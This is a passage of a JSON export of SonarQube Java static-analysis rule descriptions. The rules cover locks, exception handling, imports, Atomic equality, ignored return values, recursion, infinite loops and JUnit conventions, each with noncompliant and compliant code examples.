</li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-2225","summary":"\"toString()\" and \"clone()\" methods should not return null","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>If a lock is acquired and released within a method, then it must be released along all execution paths of that method.</p>\n<p>Failing to do so will expose the conditional locking logic to the methodâs callers and hence be deadlock-prone.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n  public void doSomething() {\n    Lock lock = new Lock();\n    lock.lock(); // Noncompliant\n    if (isInitialized()) {\n      // ...\n      lock.unlock();\n    }\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyClass {\n  public void doSomething() {\n    Lock lock = new Lock();\n    if (isInitialized()) {\n      lock.lock();\n      // ...\n      lock.unlock();\n    }\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/459\">CWE-459 - Incomplete Cleanup</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2222","summary":"Locks should be released on all paths","tags":["cwe","multi-threading","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Catching <code>Exception</code> seems like an efficient way to handle multiple possible exceptions. Unfortunately, it traps all exception types,\nboth checked and runtime exceptions, thereby casting too broad a net. Indeed, was it really the intention of developers to also catch runtime\nexceptions? To prevent any misunderstanding, if both checked and runtime exceptions are really expected to be caught, they should be explicitly listed\nin the <code>catch</code> clause.</p>\n<p>This rule raises an issue if <code>Exception</code> is caught when it is not explicitly thrown by a method in the <code>try</code> block.</p>\n<h3>Noncompliant code example</h3>\n<pre>\ntry {\n  // do something that might throw an UnsupportedDataTypeException or UnsupportedEncodingException\n} catch (Exception e) { // Noncompliant\n  // log exception ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\ntry {\n  // do something\n} catch (UnsupportedEncodingException|UnsupportedDataTypeException|RuntimeException e) {\n  // log exception ...\n}\n</pre>\n<p>or if runtime exceptions should not be caught:</p>\n<pre>\ntry {\n  // do something\n} catch (UnsupportedEncodingException|UnsupportedDataTypeException e) {\n  // log exception ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/396\">CWE-396 - Declaration of Catch for Generic Exception</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2221","summary":"\"Exception\" should not be caught when not required by called methods","tags":["cwe","error-handling"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Shared coding conventions allow teams to collaborate effectively. While types for lambda arguments are optional, specifying them anyway makes the\ncode clearer and easier to read.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nArrays.sort(rosterAsArray,\n    (a, b) -&gt; {  // Noncompliant\n        return a.getBirthday().compareTo(b.getBirthday());\n    }\n);\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nArrays.sort(rosterAsArray,\n    (Person a, Person b) -&gt; {\n        return a.getBirthday().compareTo(b.getBirthday());\n    }\n);\n</pre>\n<h3>Exceptions</h3>\n<p>When the lambda has one or two parameters and does not have a block this rule will not fire up an issue as things are considered more readable in\nthose cases.</p>\n<pre>\nstream.map((a, b) -&gt; a.length); // compliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2211","summary":"Types should be used in lambdas","tags":["convention","java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>While it is <em>possible</em> to access <code>static</code> members from a class instance, itâs bad form, and considered by most to be misleading\nbecause it implies to the readers of your code that thereâs an instance of the member per class instance.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class A {\n  public static int counter = 0;\n}\n\npublic class B {\n  private A first = new A();\n  private A second = new A();\n\n  public void runUpTheCount() {\n    first.counter ++;  // Noncompliant\n    second.counter ++;  // Noncompliant. A.counter is now 2, which is perhaps contrary to expectations\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class A {\n  public static int counter = 0;\n}\n\npublic class B {\n  private A first = new A();\n  private A second = new A();\n\n  public void runUpTheCount() {\n    A.counter ++;  // Compliant\n    A.counter ++;  // Compliant\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-2209","summary":"\"static\" members should be accessed statically","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Using wildcards in imports may look cleaner as it reduces the number of lines in the import section and simplifies the code.<br> On the other hand,\nit makes the code harder to maintain:</p>\n<ul>\n  <li> It reduces code readability as developers will have a hard time knowing where names come from. </li>\n  <li> It could lead to conflicts between names defined locally and the ones imported. </li>\n  <li> It could later raise conflicts on dependency upgrade or Java version migration, as a wildcard import that works today might be broken tomorrow.\n  </li>\n</ul>\n<p>That is why it is better to import only the specific classes or modules you need.</p>\n<h3>Exceptions</h3>\n<p>Static imports are ignored by this rule. For example:</p>\n<pre>\nimport static java.lang.Math.*;\n</pre>\n<p>will not raise an issue;</p>\n<h2>How to fix it</h2>\n<p>Depending on your IDE you can solve this issue almost <strong>automatically</strong>:<br> Look for <strong>Organize/Optimize imports</strong>\nactions. These actions can also often be applied automatically on save.<br> <em>Note:</em> To make this work properly, you must adjust IDE settings to\nuse a very high <code>allowed class count usage</code> before using wildcards.</p>\n<p>Resolving this issue <strong>manually</strong> will require a step-by-step approach:</p>\n<ol>\n  <li> Remove one wildcard import and note down compilation failures. </li>\n  <li> For each missing class, import it back with the package prefix. </li>\n  <li> When the code compiles again, proceed with the next wildcard import. </li>\n</ol>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.sql.*; // Noncompliant\nimport java.util.*; // Noncompliant\n\nprivate Date date; // Date class exists in java.sql and java.util. Which one is this?\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.sql.Date;\nimport java.util.List;\nimport java.util.ArrayList;\n\nprivate Date date;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2208","summary":"Wildcard imports should not be used","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>equals</code> method in <code>AtomicInteger</code> and <code>AtomicLong</code> returns <code>true</code> only if two instances are\nidentical, not if they represent the same number value.</p>\n<p>This is because <code>equals</code> is not part of the API contract of these classes, and they do not override the method inherited from\n<code>java.lang.Object</code>. Although both classes implement the <code>Number</code> interface, assertions about <code>equals</code> comparing\nnumber values are not part of that interface either. Only the API contract of implementing classes like <code>Integer</code>, <code>Long</code>,\n<code>Float</code>, <code>BigInteger</code>, etc., provides such assertions.</p>\n<h2>How to fix it</h2>\n<ul>\n  <li> To compare the number value of two instances <code>a</code> and <code>b</code> of <code>AtomicInteger</code> or <code>AtomicLong</code>, use\n  <code>a.get() == b.get()</code> instead of <code>a.equals(b)</code>. </li>\n  <li> If you want to check for object identity, use <code>a == b</code> instead of <code>a.equals(b)</code> to clarify your intention. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nBoolean isSameNumberValue(AtomicLong a, AtomicLong b) {\n  return a.equals(b); // Noncompliant, this is true only if a == b\n}\n\nBoolean isSameReference(AtomicLong a, AtomicLong b) {\n  return a.equals(b); // Noncompliant, because misleading\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nBoolean isSameNumberValue(AtomicLong a, AtomicLong b) {\n  return a.get() == b.get(); // Compliant\n}\n\nBoolean isSameReference(AtomicLong a, AtomicLong b) {\n  return a == b; // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/atomic/package-summary.html\">Java SE 8 API Specification: Package\n  \"java.util.concurrent.atomic\"</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://programming.guide/java/atomicinteger-equals.html\">Programming.Guide: AtomicInteger and equals / Comparable</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2204","summary":"\".equals()\" should not be used to test the values of \"Atomic\" classes","tags":["multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>While you can use either <code>forEach(list::add)</code> or <code>collect</code> with a <code>Stream</code>, <code>collect</code> is by far the\nbetter choice because itâs automatically thread-safe and parallellizable.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nList&lt;String&gt; bookNames = new ArrayList&lt;&gt;();\nbooks.stream().filter(book -&gt; book.getIsbn().startsWith(\"0\"))\n                .map(Book::getTitle)\n                .forEach(bookNames::add);  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nList&lt;String&gt; bookNames = books.stream().filter(book -&gt; book.getIsbn().startsWith(\"0\"))\n                .map(Book::getTitle)\n                .collect(Collectors.toList());\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2203","summary":"\"collect\" should be used with \"Streams\" instead of \"list::add\"","tags":["java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When the call to a function doesnât have any side effects, what is the point of making the call if the results are ignored? In such case, either\nthe function call is useless and should be dropped or the source code doesnât behave as expected.</p>\n<p>To prevent generating any false-positives, this rule triggers an issue only on the following predefined list of immutable classes in the Java API\n:</p>\n<ul>\n  <li> <code>java.lang.String</code> </li>\n  <li> <code>java.lang.Boolean</code> </li>\n  <li> <code>java.lang.Integer</code> </li>\n  <li> <code>java.lang.Double</code> </li>\n  <li> <code>java.lang.Float</code> </li>\n  <li> <code>java.lang.Byte</code> </li>\n  <li> <code>java.lang.Character</code> </li>\n  <li> <code>java.lang.Short</code> </li>\n  <li> <code>java.lang.StackTraceElement</code> </li>\n  <li> <code>java.time.DayOfWeek</code> </li>\n  <li> <code>java.time.Duration</code> </li>\n  <li> <code>java.time.Instant</code> </li>\n  <li> <code>java.time.LocalDate</code> </li>\n  <li> <code>java.time.LocalDateTime</code> </li>\n  <li> <code>java.time.LocalTime</code> </li>\n  <li> <code>java.time.Month</code> </li>\n  <li> <code>java.time.MonthDay</code> </li>\n  <li> <code>java.time.OffsetDateTime</code> </li>\n  <li> <code>java.time.OffsetTime</code> </li>\n  <li> <code>java.time.Period</code> </li>\n  <li> <code>java.time.Year</code> </li>\n  <li> <code>java.time.YearMonth</code> </li>\n  <li> <code>java.time.ZonedDateTime</code> </li>\n  <li> <code>java.math.BigInteger</code> </li>\n  <li> <code>java.math.BigDecimal</code> </li>\n  <li> <code>java.util.Optional</code> </li>\n</ul>\n<p>As well as methods of the following classes:</p>\n<ul>\n  <li> <code>java.util.Collection</code>:\n    <ul>\n      <li> <code>size()</code> </li>\n      <li> <code>isEmpty()</code> </li>\n      <li> <code>contains(...)</code> </li>\n      <li> <code>containsAll(...)</code> </li>\n      <li> <code>iterator()</code> </li>\n      <li> <code>toArray()</code> </li>\n    </ul>  </li>\n  <li> <code>java.util.Map</code>:\n    <ul>\n      <li> <code>size()</code> </li>\n      <li> <code>isEmpty()</code> </li>\n      <li> <code>containsKey(...)</code> </li>\n      <li> <code>containsValue(...)</code> </li>\n      <li> <code>get(...)</code> </li>\n      <li> <code>getOrDefault(...)</code> </li>\n      <li> <code>keySet()</code> </li>\n      <li> <code>entrySet()</code> </li>\n      <li> <code>values()</code> </li>\n    </ul>  </li>\n  <li> <code>java.util.stream.Stream</code>\n    <ul>\n      <li> <code>toArray</code> </li>\n      <li> <code>reduce</code> </li>\n      <li> <code>collect</code> </li>\n      <li> <code>min</code> </li>\n      <li> <code>max</code> </li>\n      <li> <code>count</code> </li>\n      <li> <code>anyMatch</code> </li>\n      <li> <code>allMatch</code> </li>\n      <li> <code>noneMatch</code> </li>\n      <li> <code>findFirst</code> </li>\n      <li> <code>findAny</code> </li>\n      <li> <code>toList</code> </li>\n    </ul>  </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void handle(String command){\n  command.toLowerCase(); // Noncompliant; result of method thrown away\n  ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void handle(String command){\n  String formattedCommand = command.toLowerCase();\n  ...\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule will not raise an issue when both these conditions are met:</p>\n<ul>\n  <li> The method call is in a <code>try</code> block with an associated <code>catch</code> clause. </li>\n  <li> The method name starts with \"parse\", \"format\", \"decode\" or \"valueOf\" or the method is <code>String.getBytes(Charset)</code>. </li>\n</ul>\n<pre>\nprivate boolean textIsInteger(String textToCheck) {\n\n    try {\n        Integer.parseInt(textToCheck, 10); // OK\n        return true;\n    } catch (NumberFormatException ignored) {\n        return false;\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/xzdGBQ\">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2201","summary":"Return values from functions without side effects should not be ignored","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Assuming that a comparator or <code>compareTo</code> method always returns -1 or 1 if the first operand is less than or greater than the second is\nincorrect.</p>\n<p>The specifications for both methods, <code>Comparator.compare</code> and <code>Comparable.compareTo</code>, state that their return value is \"a\nnegative integer, zero, or a positive integer as this object is less than, equal to, or greater than the specified object.\" Even if a specific\ncomparator always returns -1, 0, or 1, this is only an implementation detail, not the API contract developers can rely on.</p>\n<h2>How to fix it</h2>\n<p>Replace</p>\n<ul>\n  <li> <code>== -1</code> with <code>&lt; 0</code> (the first operand is less than the second) </li>\n  <li> <code>== 1</code> with <code>&gt; 0</code> (the first operand is greater than the second) </li>\n  <li> <code>!= -1</code> with <code>&gt;= 0</code> (the first operand is greater than or equal to the second) </li>\n  <li> <code>!= 1</code> with <code>&lt;= 0</code> (the first operand is less than or equal to the second) </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Main {\n\n  boolean isAGreaterThanB(Comparable&lt;Integer&gt; a, Integer b) {\n    return a.compareTo(b) == 1; // Noncompliant, check for constant return value\n  }\n\n  public static void main(String[] args) {\n    ByteComparator comparator = new ByteComparator();\n    if (comparator.compare((byte) 23, (byte) 42) == -1) { // Noncompliant, check for constant return value\n      System.out.println(\"23 &lt; 42\");\n    } else {\n      System.out.println(\"23 &gt;= 42\");\n    }\n  }\n\n  static class ByteComparator implements Comparator&lt;Byte&gt; {\n    @Override\n    public int compare(Byte a, Byte b) {\n      return a - b;\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Main {\n\n  boolean isAGreaterThanB(Comparable&lt;Integer&gt; a, Integer b) {\n    return a.compareTo(b) &gt; 0; // Compliant, check for positive return value\n  }\n\n  public static void main(String[] args) {\n    ByteComparator comparator = new ByteComparator();\n    if (comparator.compare((byte) 23, (byte) 42) &lt; 0) { // Compliant, check for negative return value\n      System.out.println(\"23 &lt; 42\");\n    } else {\n      System.out.println(\"23 &gt;= 42\");\n    }\n  }\n\n  static class ByteComparator implements Comparator&lt;Byte&gt; {\n    @Override\n    public int compare(Byte a, Byte b) {\n      return a - b;\n    }\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Comparable.html#compareTo-T-\">Java SE 8 API Specification:\n  Comparable.compareTo</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Comparator.html#compare-T-T-\">Java SE 8 API Specification: Comparator.compare</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-2200","summary":"\"compareTo\" results should not be checked for specific values","tags":["unpredictable"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>When the modulus of a negative number is calculated, the result will either be negative or zero. Thus, comparing the modulus of a variable for\nequality with a positive number (or a negative one) could result in unexpected results.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic boolean isOdd(int x) {\n  return x % 2 == 1;  // Noncompliant; if x is an odd negative, x % 2 == -1\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic boolean isOdd(int x) {\n  return x % 2 != 0;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/pDdGBQ\">CERT, NUM51-J.</a> - Do not assume that the remainder operator always returns a\n  nonnegative result for integral operands </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/_NUxBQ\">CERT, INT10-C</a> - Do not assume a positive remainder when using the % operator </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2197","summary":"Modulus results should not be checked for direct equality","tags":["cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Since Java 7, <code>String</code>s can be used as <code>switch</code> arguments. So when a single <code>String</code> is tested against three or\nmore values in an <code>if</code>/<code>else if</code> structure, it should be converted to a switch instead for greater readability.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif (\"red\".equals(choice)) {  // Noncompliant\n  dispenseRed();\n} else if (\"blue\".equals(choice)) {\n  dispenseBlue();\n} else if (\"yellow\".equals(choice)) {\n  dispenseYellow();\n} else {\n  promptUser();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nswitch(choice) {\n  case \"Red\":\n    dispenseRed();\n    break;\n  case \"Blue\":\n    dispenseBlue():\n    break;\n  case \"Yellow\":\n    dispenseYellow();\n    break;\n  default:\n    promptUser();\n    break;\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2196","summary":"Switches should be used for sequences of simple \"String\" tests","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<p>Recursive methods must always reach a base case where the recursion is stopped. Infinite recursion is caused by logical errors and it will crash\nyour application.</p>\n<h2>Why is this an issue?</h2>\n<p>Recursion is a technique to solve a computational problem by splitting it into smaller problems. A method is recursive, if it splits its input into\nsmaller instances and calls itself on these instances. This continues until a smallest input, a <em>base case</em>, is reached that can not be split\nfurther. Similarly, recursion can also occur when multiple methods invoke each other.</p>\n<p>Recursion is a useful tool, but it must be used carefully. Recursive methods need to detect base cases and end recursion with a <code>return</code>\nstatement. When this is not the case, recursion will continue until the stack overflows and the program crashes due to a\n<code>StackOverflowError</code>.</p>\n<h3>What is the potential impact?</h3>\n<p>Issues of this type interrupt the normal execution of a program, causing it to crash or putting it into an inconsistent state. Therefore, this\nissue might impact the availability and reliability of your application, or even result in data loss.</p>\n<h2>How to fix it</h2>\n<p>To correctly implement recursion, you must ensure that the following conditions are met:</p>\n<ol>\n  <li> On every recursive call, the input to the call needs to become smaller, meaning it needs to be brought closer to the base case. For instance,\n  if you are operating on a list, you can split it into smaller segments. If the input is numerical, you can ensure that you only make recursive calls\n  on numbers that are strictly smaller. </li>\n  <li> The recursive method must contain a <em>termination condition</em> that checks whether the base case has been reached. If so, it must not\n  perform another recursive call. For example, a base case can be that the input is an empty list. </li>\n  <li> You need to ensure that your process for splitting the input into smaller instances will actually lead to the base case. </li>\n</ol>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint myPow(int num, int exponent) {\n  num = num * myPow(num, exponent - 1); // Noncompliant: myPow unconditionally calls itself.\n  return num;  // this is never reached\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint myPow(int num, int exponent) {\n  if (exponent == 0) { // &lt;- termination condition\n    return 1;\n  }\n\n  if (exponent &lt; 0) {\n    throw new IllegalArgumentException(\"Negative exponents are not supported.\");\n  }\n\n  num = num * myPow(num, exponent - 1);\n  return num;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In the example, <code>myPow</code> computes the power of <code>num</code> to the given <code>exponent</code>. The problem is solved recursively by\ncomputing the power of <code>num</code> to <code>exponent - 1</code> first and then multiplying the result with <code>num</code>.</p>\n<p>Thus, the problem is correctly reduced to a recursive call on a strictly smaller input. However, the noncompliant implementation lacks a base case.\nI.e., the input <code>exponent</code> will eventually become negative, and the recursion never stops. This is solved by introducing the termination\ncondition <code>exponent == 0</code>, which stops the recursion.</p>\n<p>Now, the recursion is finite for all valid, non-negative input values for <code>exponent</code>. However, it would still allow for infinite\nrecursion on negative exponents. Hence, for additional safety, we add a check that leads to an <code>IllegalArgumentException</code>. Throwing this\nexception also crashes the program, but for the right reasons: It reports misuse of the method and provides useful debugging information to the\nprogrammer.</p>\n<h3>Pitfalls</h3>\n<p>Even when implemented correctly, recursion can still lead to a <code>StackOverflowError</code>. Every recursive call consumes memory on the stack.\nIf the number of recursive calls is large enough, the available stack memory can be exhausted, even for finite recursions. Thus, for large input\nsizes, recursion should be avoided.</p>\n<h3>Going the extra mile</h3>\n<p>There are techniques for converting any recursive method into a loop-based, iterative method. This can be utilized when running into the pitfall of\nrecursion on large inputs.</p>\n<p>For instance, the following is an iterative version of the previous example:</p>\n<pre>\nint myPow(int num, int exponent) {\n  if (exponent &lt; 0) {\n    throw new IllegalArgumentException(\"Negative exponents are not supported.\");\n  }\n\n  int result = 1;\n  while (exponent &gt; 0) {\n    result *= num;\n    --exponent;\n  }\n\n  return result;\n}\n</pre>\n<p>As the conversion of recursive methods into iterative methods is a complex topic, we refer to external articles on the topic. See the section\n<em>Articles &amp; blog posts</em> under the tab <em>More Info</em>.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/StackOverflowError.html\">StackOverflowError</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/cs/convert-recursion-to-iteration\">From Recursive to Iterative Functions</a> by Baeldung. </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> The JVMS on <a href=\"https://docs.oracle.com/javase/specs/jvms/se17/html/jvms-2.html#jvms-2.5.2\">Stacks</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-2190","summary":"Recursion should not be infinite","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>An infinite loop will never end while the program runs, meaning you have to kill the program to get out of the loop. Every loop should have an end\ncondition, whether by meeting the loopâs termination condition or via a <code>break</code> statement.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nfor (;;) {  // Noncompliant; end condition omitted\n  // ...\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nint j;\nwhile (true) { // Noncompliant; end condition omitted\n  j++;\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nint k;\nboolean b = true;\nwhile (b) { // Noncompliant; b never written to in loop\n  k++;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nint j;\nwhile (true) { // reachable end condition added\n  j++;\n  if (j  == Integer.MIN_VALUE) {  // true at Integer.MAX_VALUE +1\n    break;\n  }\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nint k;\nboolean b = true;\nwhile (b) {\n  k++;\n  b = k &lt; Integer.MAX_VALUE;\n}\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/lzZGBQ\">CERT, MSC01-J.</a> - Do not use an empty infinite loop </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2189","summary":"Loops should not be infinite","tags":["cert","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Overriding a parent class method prevents that method from being called unless an explicit <code>super</code> call is made in the overriding\nmethod. In some cases, not calling the parent method is fine. However, <code>setUp</code> and <code>tearDown</code> provide some shared logic that is\ncalled before all test cases. This logic may change over the lifetime of your codebase. To make sure that your test cases are set up and cleaned up\nconsistently, your overriding implementations of <code>setUp</code> and <code>tearDown</code> should call the parent implementations explicitly.</p>\n<h2>How to fix it</h2>\n<p>Add an explicit call to <code>super.setUp()</code> and <code>super.tearDown()</code> in the overriding methods.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClassTest extends MyAbstractTestCase {\n\n  private MyClass myClass;\n\n  @Override\n  protected void setUp() throws Exception {  // Noncompliant\n    myClass = new MyClass();\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClassTest extends MyAbstractTestCase {\n\n  private MyClass myClass;\n\n  @Override\n  protected void setUp() throws Exception {\n    super.setUp();\n    myClass = new MyClass();\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2188","summary":"JUnit test cases should call super methods","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Thereâs no point in having a JUnit <code>TestCase</code> without any test methods. 